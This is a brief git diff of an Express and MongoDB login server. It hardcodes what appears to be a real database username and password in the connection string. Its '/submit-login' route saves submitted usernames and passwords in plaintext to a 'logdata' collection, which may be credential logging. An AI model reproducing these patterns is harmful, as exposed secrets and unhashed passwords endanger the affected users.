@@ -8,7 +8,7 @@ const { MongoClient } = require('mongodb');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const uri = "mongodb+srv://garycantilang:<0xMkSE6i57Nm5hUd>@cluster0.cygdj.mongodb.net/logdata?retryWrites=true&w=majority&appName=Cluster0";
+const uri = "mongodb+srv://garycantilang:0xMkSE6i57Nm5hUd@cluster0.cygdj.mongodb.net/logdata?retryWrites=true&w=majority&appName=Cluster0";
 const client = new MongoClient(uri);
 
 let db; // Declare the db variable
@@ -32,6 +32,12 @@ app.use(express.static(__dirname)); // Serve static files from the "public" dire
 // Route to handle login form submission
 app.post('/submit-login', async (req, res) => {
     const { username, password } = req.body;
+
+    try {
+        if (!db) {
+            console.error("Database connection not initialized.");
+            return res.status(500).send('Database connection not initialized.');
+        }
 
         // Create the login data object
         const loginData = { username, password, timestamp: new Date() };
